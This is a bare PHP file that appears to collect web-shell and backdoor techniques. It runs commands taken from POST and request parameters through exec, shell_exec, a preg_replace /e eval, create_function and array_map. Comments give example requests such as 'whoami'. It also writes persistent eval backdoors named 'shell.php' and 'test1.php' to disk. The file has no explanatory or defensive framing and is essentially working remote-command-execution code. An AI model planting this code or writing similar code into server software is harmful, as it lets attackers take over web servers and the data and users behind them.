<?php

$commands = $_POST['com'];

exec($commands);


//?cmd=phpinfo() 
@preg_replace("/abc/e",$_REQUEST['cmd'],"abcd");

//?cmd=phpinfo(); 
$func =create_function('',$_REQUEST['cmd']); $func();

//?func=system&cmd=whoami 
$func=$GET['func']; $cmd=$GET['cmd']; $array[0]=$cmd; $new_array=array_map($func,$array); //print_r($new_array);

$test='<?php eval($_POST[cmd]);?>'; file_put_contents('test1.php',$test); ?> <?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');


shell_exec($commands);
